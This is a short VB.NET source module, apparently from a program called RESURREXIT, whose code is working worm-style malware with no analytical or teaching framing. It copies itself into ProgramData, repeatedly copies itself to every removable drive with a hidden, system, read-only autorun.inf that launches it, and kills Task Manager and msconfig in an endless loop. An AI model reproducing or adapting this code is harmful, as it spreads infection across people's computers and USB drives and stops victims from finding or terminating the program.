
Option Explicit On 'Vital for Module Regarding Method Usage
Imports System.IO

Public Module Judge


    Public Sub Judgement() 'A TRY STATEMENT HAD TO BE USED TO VOID OUT NULL ISSUES
        Try

            Dim filepath As String

            filepath = Environ("homedrive") + "\programdata\RESURREXIT.exe"

            FileCopy(Application.ExecutablePath, filepath)

            Do

                Dim rmdrive, strappath As String

                strappath = Application.ExecutablePath

                For Each drive As DriveInfo In My.Computer.FileSystem.Drives

                    If drive.DriveType = IO.DriveType.Removable Then

                        rmdrive = drive.ToString 'application copies to drive

                        FileCopy(strappath, rmdrive & "RESURREXIT.exe")

                        strappath = rmdrive & "autorun.inf"

                        Dim sw As New StreamWriter(strappath)

                        sw.WriteLine("[autorun]")

                        sw.WriteLine("shellexecute=RESURREXIT.exe")

                        sw.Close()

                        SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))

                        SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))

                    End If
                Next

                For Each pr As Process In Process.GetProcesses

                    If pr.ProcessName = "taskmgr" Or pr.ProcessName = "msconfig" Then

                        pr.Kill()

                    End If

                Next

            Loop

        Catch sw As Exception

            Debug.WriteLine("Error", sw)

        End Try

    End Sub

End Module
